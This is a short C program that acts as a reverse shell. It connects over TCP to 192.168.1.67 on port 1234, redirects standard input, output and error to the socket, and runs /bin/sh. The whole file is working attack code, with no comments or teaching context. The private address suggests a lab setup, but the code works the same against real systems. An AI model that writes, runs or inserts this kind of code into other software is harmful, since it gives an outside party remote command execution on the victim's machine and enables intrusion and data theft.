#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
#include<netinet/in.h>
#include<arpa/inet.h>
#include<sys/socket.h>
#include<sys/types.h>

int main()
{
	char * const argv[] = {"/bin/sh", NULL};
	int sockfd;
	int port = 1234;
	struct sockaddr_in mysockaddr;

	sockfd = socket(AF_INET, SOCK_STREAM, 0);
	mysockaddr.sin_family = AF_INET;
	mysockaddr.sin_port = htons(port);
	mysockaddr.sin_addr.s_addr = inet_addr("192.168.1.67");

	connect(sockfd, (struct sockaddr *) &mysockaddr,
			sizeof(mysockaddr));

	dup2(sockfd, 0);
	dup2(sockfd, 1);
	dup2(sockfd, 2);

	execve("/bin/sh", argv, NULL);
	return 0;
}
